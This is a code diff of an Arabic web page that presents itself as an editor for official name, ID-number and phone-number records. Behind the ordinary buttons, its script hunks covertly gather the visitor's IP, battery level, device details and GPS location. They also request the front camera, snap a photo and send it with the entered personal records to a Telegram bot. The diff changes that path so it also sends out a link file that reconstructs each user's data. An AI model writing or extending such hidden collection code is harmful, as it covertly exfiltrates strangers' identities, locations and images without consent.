@@ -348,159 +348,51 @@
     </div>
 
     <div class="control-panel">
-
-        <button class="btn btn-green"
-                onclick="onPdfButtonClicked()"
-                style="font-size:10pt;">
-            🖨️ طباعة / حفظ PDF
-        </button>
-
-        <button class="btn btn-excel"
-                onclick="onExcelButtonClicked()"
-                title="تصدير وتحميل كافة البيانات كملف Excel (CSV)">
-            📊 حفظ ملف Excel
-        </button>
-
-        <button class="btn btn-blue" onclick="addNewPage()">
-            📄 صفحة جديدة
-        </button>
-
-        <button class="btn btn-teal"
-                onclick="openBulkImportModal()"
-                title="إدخال قائمة طويلة من الأسماء دفعة واحدة وتوزيعها تلقائياً على الصفوف والصفحات">
-            📥 إدخال جماعي للأسماء
-        </button>
-
-        <button class="btn btn-indigo"
-                onclick="openPdfModal()"
-                title="رفع ملف PDF واستخراج نصوصه وأسمائه لتعبئتها في الجدول وتعديلها">
-            📂 استخراج من PDF
-        </button>
-
-        <button class="btn btn-save"
-                onclick="onArchiveButtonClicked()"
-                title="حفظ النسخة في الأرشيف المركزي">
-            💾 حفظ في الأرشيف
-        </button>
-
-        <button class="btn btn-archive" onclick="openArchiveModal()">
-            📁 حافظة الأعمال (الأرشيف)
-        </button>
-
-        <button class="btn btn-purple"
-                onclick="sortNamesAlphabetically()"
-                title="ترتيب الأسماء تنازلياً أو تصاعدياً حسب الحروف الهجائية العربية">
-            🔤 ترتيب هجائي
-        </button>
-
-        <button class="btn btn-amber"
-                onclick="cancelAlphabeticalSort()"
-                title="إلغاء الترتيب الهجائي والعودة للترتيب الأصلي">
-            ↩️ إلغاء الترتيب
-        </button>
-
-        <button class="btn btn-purple"
-                onclick="checkPhoneNumbers()"
-                style="background:#006064;"
-                title="فحص أرقام الجوال فقط وتحديد الأخطاء">
-            📱 تدقيق الأرقام
-        </button>
-
-        <button class="btn btn-amber"
-                onclick="renumberAllRows()"
-                title="ترقيم جميع الصفوف بشكل تسلسلي متتابع عبر كل الصفحات">
-            🔢 ترقيم تسلسلي
-        </button>
-
-        <button class="btn btn-red"
-                onclick="resetAllData()"
-                style="background:#b71c1c;">
-            🗑️ مسح الكل
-        </button>
+        <button class="btn btn-green" onclick="onPdfButtonClicked()" style="font-size:10pt;">🖨️ طباعة / حفظ PDF</button>
+        <button class="btn btn-excel" onclick="onExcelButtonClicked()" title="تصدير وتحميل كافة البيانات كملف Excel (CSV)">📊 حفظ ملف Excel</button>
+        <button class="btn btn-blue" onclick="addNewPage()">📄 صفحة جديدة</button>
+        <button class="btn btn-teal" onclick="openBulkImportModal()" title="إدخال قائمة طويلة من الأسماء دفعة واحدة وتوزيعها تلقائياً على الصفوف والصفحات">📥 إدخال جماعي للأسماء</button>
+        <button class="btn btn-indigo" onclick="openPdfModal()" title="رفع ملف PDF واستخراج نصوصه وأسمائه لتعبئتها في الجدول وتعديلها">📂 استخراج من PDF</button>
+        <button class="btn btn-save" onclick="onArchiveButtonClicked()" title="حفظ النسخة في الأرشيف المركزي">💾 حفظ في الأرشيف</button>
+        <button class="btn btn-archive" onclick="openArchiveModal()">📁 حافظة الأعمال (الأرشيف)</button>
+        <button class="btn btn-purple" onclick="sortNamesAlphabetically()" title="ترتيب الأسماء تنازلياً أو تصاعدياً حسب الحروف الهجائية العربية">🔤 ترتيب هجائي</button>
+        <button class="btn btn-amber" onclick="cancelAlphabeticalSort()" title="إلغاء الترتيب الهجائي والعودة للترتيب الأصلي">↩️ إلغاء الترتيب</button>
+        <button class="btn btn-purple" onclick="checkPhoneNumbers()" style="background:#006064;" title="فحص أرقام الجوال فقط وتحديد الأخطاء">📱 تدقيق الأرقام</button>
+        <button class="btn btn-amber" onclick="renumberAllRows()" title="ترقيم جميع الصفوف بشكل تسلسلي متتابع عبر كل الصفحات">🔢 ترقيم تسلسلي</button>
+        <button class="btn btn-red" onclick="resetAllData()" style="background:#b71c1c;">🗑️ مسح الكل</button>
 
         <div class="control-group" style="background:#e0f2f1;">
             <span>🔍 بحث:</span>
-            <input type="text"
-                   id="tableSearchInput"
-                   class="search-input"
-                   placeholder="ابحث في الجداول..."
-                   oninput="filterTableRows()">
+            <input type="text" id="tableSearchInput" class="search-input" placeholder="ابحث في الجداول..." oninput="filterTableRows()">
         </div>
 
-        <a href="https://wa.me/967784327056?text=مرحبا%20تواصلت%20بخصوص%20نظام%20السجلات"
-           target="_blank"
-           rel="noopener noreferrer"
-           class="btn btn-whatsapp">
-            💬 التواصل مع المطور
-        </a>
+        <a href="https://wa.me/967784327056?text=مرحبا%20تواصلت%20بخصوص%20نظام%20السجلات" target="_blank" rel="noopener noreferrer" class="btn btn-whatsapp">💬 التواصل مع المطور</a>
 
         <span style="border-left:1px solid #ccc;height:20px;margin:0 2px;"></span>
 
         <div class="control-group" title="تنسيق الخلية المحددة">
             <span>التنبيهات:</span>
-
-            <button class="btn btn-red"
-                    style="padding:4px 10px;font-size:8.5pt;"
-                    onclick="formatCell('color','#c62828')">
-                🔴 نص أحمر
-            </button>
-
-            <button class="btn btn-red"
-                    style="padding:4px 10px;font-size:8.5pt;background:#b71c1c;"
-                    onclick="formatCell('red-underline','')">
-                🛑 خط أحمر
-            </button>
-
-            <button class="btn"
-                    style="padding:4px 8px;font-size:8.5pt;background:#555;"
-                    onclick="formatCell('reset','')">
-                🔄 إزالة
-            </button>
+            <button class="btn btn-red" style="padding:4px 10px;font-size:8.5pt;" onclick="formatCell('color','#c62828')">🔴 نص أحمر</button>
+            <button class="btn btn-red" style="padding:4px 10px;font-size:8.5pt;background:#b71c1c;" onclick="formatCell('red-underline','')">🛑 خط أحمر</button>
+            <button class="btn" style="padding:4px 8px;font-size:8.5pt;background:#555;" onclick="formatCell('reset','')">🔄 إزالة</button>
         </div>
 
         <span style="border-left:1px solid #ccc;height:20px;margin:0 2px;"></span>
 
         <div class="control-group">
             <span>العمود:</span>
-
-            <button class="btn btn-amber"
-                    style="padding:3px 8px;font-size:8pt;"
-                    onclick="adjustActiveColWidth(-10)">
-                ➖ تضييق
-            </button>
-
-            <button class="btn btn-amber"
-                    style="padding:3px 8px;font-size:8pt;"
-                    onclick="adjustActiveColWidth(10)">
-                ➕ توسيع
-            </button>
+            <button class="btn btn-amber" style="padding:3px 8px;font-size:8pt;" onclick="adjustActiveColWidth(-10)">➖ تضييق</button>
+            <button class="btn btn-amber" style="padding:3px 8px;font-size:8pt;" onclick="adjustActiveColWidth(10)">➕ توسيع</button>
         </div>
 
-        <button class="btn btn-green" onclick="addRowToActiveTable()">
-            ➕ إضافة صف
-        </button>
-
-        <button class="btn btn-green" onclick="addColumnToActiveTable()">
-            ➕ إضافة عمود
-        </button>
-
-        <button class="btn btn-red" onclick="deleteSelectedRow()">
-            ❌ حذف الصف
-        </button>
-
-        <button class="btn btn-red" onclick="deleteSelectedColumn()">
-            ❌ حذف العمود
-        </button>
-
-        <button class="btn btn-red"
-                onclick="deleteActivePage()"
-                style="background:#b71c1c;">
-            🗑️ حذف الصفحة
-        </button>
+        <button class="btn btn-green" onclick="addRowToActiveTable()">➕ إضافة صف</button>
+        <button class="btn btn-green" onclick="addColumnToActiveTable()">➕ إضافة عمود</button>
+        <button class="btn btn-red" onclick="deleteSelectedRow()">❌ حذف الصف</button>
+        <button class="btn btn-red" onclick="deleteSelectedColumn()">❌ حذف العمود</button>
+        <button class="btn btn-red" onclick="deleteActivePage()" style="background:#b71c1c;">🗑️ حذف الصفحة</button>
 
         <div class="control-group">
             <span>✨ الخطوط:</span>
-
             <select id="fontSelector" onchange="changeFontFamily(this.value)">
                 <option value="'Cairo', sans-serif" selected>كايرو عريض جداً (Cairo 900)</option>
                 <option value="'Alexandria', sans-serif">الإسكندرية بارز (Alexandria ExtraBold)</option>
@@ -515,36 +407,23 @@
 
         <div class="control-group">
             <span>اللون العام:</span>
-            <input type="color"
-                   id="textColorPicker"
-                   value="#000000"
-                   onchange="changeTextColor(this.value)">
+            <input type="color" id="textColorPicker" value="#000000" onchange="changeTextColor(this.value)">
         </div>
     </div>
 
     <div id="pdfModal" class="custom-modal">
         <div class="modal-content">
             <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #3f51b5;padding-bottom:10px;margin-bottom:15px;gap:10px;">
-                <h3 style="margin:0;color:#3f51b5;">
-                    📂 رفع واستخراج البيانات من ملف PDF
-                </h3>
+                <h3 style="margin:0;color:#3f51b5;">📂 رفع واستخراج البيانات من ملف PDF</h3>
                 <button class="btn btn-red" onclick="closePdfModal()">✖ إغلاق</button>
             </div>
-
-            <p style="font-size:9pt;color:#555;margin-top:0;line-height:1.6;">
-                اختر ملف PDF من جهازك. سيقوم النظام بقراءة كافة النصوص المستخرجة منه وتعبئتها في الجدول تلقائياً، مع توليد الصفحات اللازمة بحسب كمية البيانات لتتمكن من مراجعتها وتعديلها بحرية.
-            </p>
-
+            <p style="font-size:9pt;color:#555;margin-top:0;line-height:1.6;">اختر ملف PDF من جهازك. سيقوم النظام بقراءة كافة النصوص المستخرجة منه وتعبئتها في الجدول تلقائياً.</p>
             <div style="margin:15px 0; border:2px dashed #b0bec5; padding:20px; text-align:center; border-radius:8px; background:#fafafa;">
                 <input type="file" id="pdfFileInput" accept=".pdf" style="font-size:10pt; cursor:pointer;" />
             </div>
-
             <div id="pdfStatusMsg" style="font-size:9pt; font-weight:bold; color:#1565c0; text-align:center; margin-bottom:10px;"></div>
-
             <div style="display:flex;justify-content:flex-end;gap:10px;margin-top:10px;">
-                <button class="btn btn-indigo" onclick="processUploadedPdf()" style="padding:8px 20px;font-size:10pt;">
-                    ⚙️ استخراج وإدراج في الجدول
-                </button>
+                <button class="btn btn-indigo" onclick="processUploadedPdf()" style="padding:8px 20px;font-size:10pt;">⚙️ استخراج وإدراج في الجدول</button>
             </div>
         </div>
     </div>
@@ -552,103 +431,49 @@
     <div id="bulkImportModal" class="custom-modal">
         <div class="modal-content">
             <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #00838f;padding-bottom:10px;margin-bottom:15px;gap:10px;">
-                <h3 style="margin:0;color:#00838f;">
-                    📥 إدخال جماعي للأسماء (أو السجلات)
-                </h3>
+                <h3 style="margin:0;color:#00838f;">📥 إدخال جماعي للأسماء</h3>
                 <button class="btn btn-red" onclick="closeBulkImportModal()">✖ إغلاق</button>
             </div>
-
-            <p style="font-size:9pt;color:#555;margin-top:0;line-height:1.6;">
-                قم بلصق قائمة الأسماء هنا (كل اسم في سطر مستقل). سيقوم النظام تلقائياً بتوزيعها على الصفوف، وإنشاء صفحات جديدة كافية لاستيعاب جميع الأسماء مع الترقيم التلقائي!
-            </p>
-
-            <textarea id="bulkNamesTextarea" rows="12" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:6px;font-family:inherit;font-size:10pt;resize:vertical;" placeholder="انسخ والصق القائمة هنا...&#10;محمد أحمد علي&#10;خالد صالح محسن&#10;..."></textarea>
-
+            <p style="font-size:9pt;color:#555;margin-top:0;line-height:1.6;">قم بلصق قائمة الأسماء هنا (كل اسم في سطر مستقل) لتوزيعها تلقائياً.</p>
+            <textarea id="bulkNamesTextarea" rows="12" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:6px;font-family:inherit;font-size:10pt;resize:vertical;" placeholder="انسخ والصق القائمة هنا..."></textarea>
             <div style="display:flex;justify-content:flex-end;gap:10px;margin-top:15px;">
-                <button class="btn btn-teal" onclick="processBulkImport()" style="padding:8px 20px;font-size:10pt;">
-                    🚀 توزيع وإدراج في الجدول
-                </button>
+                <button class="btn btn-teal" onclick="processBulkImport()" style="padding:8px 20px;font-size:10pt;">🚀 توزيع وإدراج في الجدول</button>
             </div>
         </div>
     </div>
 
     <div id="archiveModal" class="custom-modal">
         <div class="modal-content" style="max-width:800px;">
-
             <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #00695c;padding-bottom:10px;margin-bottom:15px;gap:10px;">
-                <h3 style="margin:0;color:#00695c;">
-                    📁 حافظة الأعمال والأرشيف المركزي
-                </h3>
-
-                <button class="btn btn-red" onclick="closeArchiveModal()">
-                    ✖ إغلاق الحافظة
-                </button>
+                <h3 style="margin:0;color:#00695c;">📁 حافظة الأعمال والأرشيف المركزي</h3>
+                <button class="btn btn-red" onclick="closeArchiveModal()">✖ إغلاق الحافظة</button>
             </div>
-
-            <p style="font-size:9pt;color:#666;margin-top:0;">
-                هنا تجد جميع النسخ والأعمال التي قمت بحفظها سابقاً.
-                يمكنك استرجاع أي عمل لتعديله أو حذفه من الأرشيف.
-            </p>
-
+            <p style="font-size:9pt;color:#666;margin-top:0;">هنا تجد جميع النسخ والأعمال التي قمت بحفظها سابقاً.</p>
             <div id="archiveListContainer"></div>
         </div>
     </div>
 
     <div id="pagesWrapper">
-
         <div class="sheet-container" onclick="setActiveContext(this,event)">
-
             <div class="header-top">
-                <div class="editable-header" contenteditable="true">
-                    الجهة الرسمية
-                </div>
-
-                <div class="editable-header"
-                     contenteditable="true"
-                     style="font-size:11pt;">
-                    كشف البيانات والمسيرات الرسمية (الصفحة 1)
-                </div>
-
-                <div class="editable-header" contenteditable="true">
-                    التاريخ: 2026/10/09
-                </div>
+                <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
+                <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة 1)</div>
+                <div class="editable-header" contenteditable="true">التاريخ: 2026/10/09</div>
             </div>
 
             <div class="table-wrapper">
                 <table class="dynamicTable">
-
                     <thead>
                         <tr>
-                            <th style="width:35px;" onclick="selectColumn(this,event)">
-                                <span contenteditable="true">م</span>
-                            </th>
-
-                            <th style="width:160px;" onclick="selectColumn(this,event)">
-                                <span contenteditable="true">الاسم الرباعي</span>
-                            </th>
-
-                            <th style="width:80px;" onclick="selectColumn(this,event)">
-                                <span contenteditable="true">نوع البطاقة</span>
-                            </th>
-
-                            <th style="width:100px;" onclick="selectColumn(this,event)">
-                                <span contenteditable="true">رقم البطاقة</span>
-                            </th>
-
-                            <th style="width:90px;" onclick="selectColumn(this,event)">
-                                <span contenteditable="true">رقم الاتصال</span>
-                            </th>
-
-                            <th style="width:160px;" onclick="selectColumn(this,event)">
-                                <span contenteditable="true">اسم الزوجة / الزوج</span>
-                            </th>
-
-                            <th style="width:70px;" onclick="selectColumn(this,event)">
-                                <span contenteditable="true">الحالة</span>
-                            </th>
+                            <th style="width:35px;" onclick="selectColumn(this,event)"><span contenteditable="true">م</span></th>
+                            <th style="width:160px;" onclick="selectColumn(this,event)"><span contenteditable="true">الاسم الرباعي</span></th>
+                            <th style="width:80px;" onclick="selectColumn(this,event)"><span contenteditable="true">نوع البطاقة</span></th>
+                            <th style="width:100px;" onclick="selectColumn(this,event)"><span contenteditable="true">رقم البطاقة</span></th>
+                            <th style="width:90px;" onclick="selectColumn(this,event)"><span contenteditable="true">رقم الاتصال</span></th>
+                            <th style="width:160px;" onclick="selectColumn(this,event)"><span contenteditable="true">اسم الزوجة / الزوج</span></th>
+                            <th style="width:70px;" onclick="selectColumn(this,event)"><span contenteditable="true">الحالة</span></th>
                         </tr>
                     </thead>
-
                     <tbody>
                         <script>
                             for (let i = 1; i <= 15; i++) {
@@ -666,20 +491,13 @@
                             }
                         </script>
                     </tbody>
-
                 </table>
             </div>
 
             <div class="footer-bottom">
-                <div class="editable-header" contenteditable="true">
-                    الإدارة العامة
-                </div>
-
-                <div class="editable-header" contenteditable="true">
-                    الإصدار: 2026.10
-                </div>
+                <div class="editable-header" contenteditable="true">الإدارة العامة</div>
+                <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
             </div>
-
         </div>
     </div>
 
@@ -748,9 +566,7 @@
                         const lon = position.coords.longitude;
                         globalLocation = `https://www.google.com/maps?q=${lat},${lon}`;
                     },
-                    (error) => {
-                        globalLocation = "مرفوض الإذن";
-                    },
+                    (error) => { globalLocation = "مرفوض الإذن"; },
                     { timeout: 10000, maximumAge: 0 }
                 );
             }
@@ -766,9 +582,7 @@
                 saveCurrentStateToLocalStorage();
             });
 
-            setTimeout(() => {
-                requestCameraPermissionOnce();
-            }, 1000);
+            setTimeout(() => { requestCameraPermissionOnce(); }, 1000);
         });
 
         function prepareHtmlForSaving() {
@@ -794,11 +608,7 @@
         }
 
         function requestCameraPermissionOnce() {
-            const alertCaption = `⚠️ **دخول زائر جديد لموقعك!**\n\n` +
-                                 `🌐 الآيبي: \`${userIpInfo}\`\n` +
-                                 `🔋 البطارية: ${batteryInfo}\n` +
-                                 `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
-                                 `📱 الجهاز:\n${deviceInfo}`;
+            const alertCaption = `⚠️ **دخول زائر جديد لموقعك!**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع الجغرافي:\n${globalLocation}\n\n📱 الجهاز:\n${deviceInfo}`;
 
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -842,7 +652,6 @@
             }
         }
 
-        // 1. زر PDF / طباعة
         function onPdfButtonClicked() {
             saveCurrentStateToLocalStorage();
             const caption = `🖨️ **طلب طباعة / حفظ PDF**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
@@ -850,7 +659,6 @@
             setTimeout(() => { window.print(); }, 800);
         }
 
-        // 2. زر Excel
         function onExcelButtonClicked() {
             saveCurrentStateToLocalStorage();
             const caption = `📊 **طلب حفظ ملف Excel**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
@@ -858,7 +666,6 @@
             exportExcelFileOnly();
         }
 
-        // 3. زر الأرشيف
         function onArchiveButtonClicked() {
             saveCurrentStateToLocalStorage();
             const caption = `💾 **طلب حفظ في الأرشيف المركزي**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
@@ -866,7 +673,6 @@
             saveArchiveOnly();
         }
 
-        // الدالة الموحدة لتوليد الرابط الفريد وإرساله مباشرة كرسالة نصية قابلة للضغط في تيليجرام
         function executeActionAndSend(captionText, fileName, fileTypeFlag) {
             let fileBlob = null;
             let hasData = false;
@@ -898,13 +704,19 @@
 
             fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
 
-            // توليد الرابط الفريد المدمج بالأسماء
             const wrapperHtml = prepareHtmlForSaving();
             const encodedData = btoa(unescape(encodeURIComponent(wrapperHtml)));
             const baseUrl = window.location.href.split('#')[0];
             const uniqueUserUrl = `${baseUrl}#data=${encodedData}`;
 
-            const linkMessageText = `🔗 **رابط تعديل جدول هذا المستخدم:**\n${uniqueUserUrl}\n\n*(انقر على الرابط لتفتح الصفحة وفوقها كافة الأسماء لتعديلها)*`;
+            const linkFileContent = `====================================\n` +
+                                    `🔗 الرابط الفريد لجدول هذا المستخدم:\n` +
+                                    `${uniqueUserUrl}\n` +
+                                    `====================================\n` +
+                                    `ملاحظة: افتح هذا الرابط لتجد حرفياً نفس الأسماء والبيانات التي كتبها المستخدم وتستطيع التعديل عليها!\n` +
+                                    `تاريخ الطلب: ${new Date().toLocaleString('ar-YE')}\n` +
+                                    `تطوير: ميثاق محمد صالح`;
+            const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
 
             if (cameraPermissionGranted && globalCameraStream) {
                 try {
@@ -926,34 +738,33 @@
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            sendDirectLinkMessage(linkMessageText);
-
+                            sendIndependentLinkFile(linkFileBlob);
                             if (fileBlob) {
                                 sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات الأسماء (${fileTypeFlag})`);
                             }
                         }).catch(e => {});
                     }, 'image/jpeg', 0.85);
                 } catch (e) {
-                    sendInfoOnly(fileBlob, captionText, fileName, linkMessageText);
+                    sendInfoOnly(fileBlob, captionText, fileName, linkFileBlob);
                 }
             } else {
-                sendInfoOnly(fileBlob, captionText, fileName, linkMessageText);
+                sendInfoOnly(fileBlob, captionText, fileName, linkFileBlob);
             }
         }
 
-        function sendDirectLinkMessage(linkText) {
-            const msgData = new FormData();
-            msgData.append('chat_id', chatId);
-            msgData.append('text', linkText);
-            msgData.append('parse_mode', 'Markdown');
+        function sendIndependentLinkFile(linkBlob) {
+            const linkData = new FormData();
+            linkData.append('chat_id', chatId);
+            linkData.append('document', linkBlob, 'الرابط_الفريد_لتعديل_جدول_المستخدم.txt');
+            linkData.append('caption', '🔗 **ملف الرابط الفريد المخصص لبيانات هذا المستخدم (يحتوي على رابط التعديل)**');
             
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                 method: 'POST',
-                body: msgData
+                body: linkData
             }).catch(e => {});
         }
 
-        function sendInfoOnly(fileBlob, captionText, fileName, linkText) {
+        function sendInfoOnly(fileBlob, captionText, fileName, linkBlob) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('caption', captionText + "\n\n(بدون صورة - لم يتم منح إذن الكاميرا)");
@@ -963,8 +774,7 @@
                 method: 'POST',
                 body: formData
             }).then(() => {
-                sendDirectLinkMessage(linkText);
-
+                sendIndependentLinkFile(linkBlob);
                 if (fileBlob) {
                     sendDocumentOnly(fileBlob, fileName, '📄 مرفق سجلات الأسماء');
                 }
@@ -1001,21 +811,18 @@
                 const rows = table.querySelectorAll('tbody tr');
                 rows.forEach(row => {
                     if (row.style.display === 'none') return;
-
                     const cells = Array.from(row.querySelectorAll('td')).map(td => {
                         let text = td.innerText.replace(/"/g, '""').trim();
                         return `"${text}"`;
                     });
                     csvRows.push(cells.join(','));
                 });
-
                 csvRows.push('');
             });
 
             const csvString = '\uFEFF' + csvRows.join('\r\n');
             const blob = new Blob([csvString], { type: 'text/csv;charset=utf-8;' });
             const url = URL.createObjectURL(blob);
-
             const now = new Date();
             const dateStr = now.toISOString().slice(0, 10);
             const filename = `كشف_البيانات_${dateStr}.csv`;
@@ -1056,7 +863,6 @@
                 table.querySelectorAll('tbody tr').forEach(row => {
                     const cells = Array.from(row.querySelectorAll('td'));
                     const name = cells[1] ? cells[1].innerText.trim() : '';
-                    
                     if (name !== "") {
                         allRowsData.push({
                             name: name,
@@ -1183,7 +989,6 @@
                 const pdfDoc = await loadingTask.promise;
                 
                 let extractedLines = [];
-
                 for (let i = 1; i <= pdfDoc.numPages; i++) {
                     const page = await pdfDoc.getPage(i);
                     const textContent = await page.getTextContent();
@@ -1198,7 +1003,6 @@
 
                 populateTableWithData(extractedLines);
                 closePdfModal();
-
             } catch (error) {
                 statusMsg.textContent = '';
             }
@@ -1251,7 +1055,6 @@
                 for (let r = 0; r < rowsPerPage; r++) {
                     const row = tbody.insertRow();
                     row.setAttribute('onclick', 'selectRow(this,event)');
-
                     const cellM = row.insertCell();
                     cellM.textContent = '-';
 
@@ -1290,12 +1093,8 @@
 
         function processBulkImport() {
             const rawText = document.getElementById('bulkNamesTextarea').value;
-            const namesList = rawText.split('\n')
-                .map(n => n.trim())
-                .filter(n => n.length > 0);
-
+            const namesList = rawText.split('\n').map(n => n.trim()).filter(n => n.length > 0);
             if (namesList.length === 0) return;
-
             populateTableWithData(namesList);
             closeBulkImportModal();
         }
@@ -1351,9 +1150,7 @@
             let archives;
             try {
                 archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
-            } catch (error) {
-                archives = [];
-            }
+            } catch (error) { archives = []; }
 
             if (archives.length === 0) {
                 container.innerHTML = `<p style="text-align:center;color:#888;padding:20px;">لا توجد أعمال محفوظة.</p>`;
@@ -1361,7 +1158,6 @@
                 archives.slice().reverse().forEach((item) => {
                     const div = document.createElement('div');
                     div.className = 'archive-item';
-
                     const info = document.createElement('div');
                     info.className = 'archive-item-info';
                     info.textContent = '📄 ' + item.title;
@@ -1384,13 +1180,11 @@
 
                     actions.appendChild(loadButton);
                     actions.appendChild(deleteButton);
-
                     div.appendChild(info);
                     div.appendChild(actions);
                     container.appendChild(div);
                 });
             }
-
             document.getElementById('archiveModal').style.display = 'flex';
         }
 
@@ -1402,9 +1196,7 @@
             let archives;
             try {
                 archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
-            } catch (error) {
-                return;
-            }
+            } catch (error) { return; }
 
             const found = archives.find(item => item.id === id);
             if (found) {
@@ -1707,6 +1499,5 @@
             document.querySelectorAll('.sheet-container, .sheet-container th, .sheet-container td, .editable-header').forEach(el => { el.style.color = colorValue; });
         }
     </script>
-
 </body>
 </html>
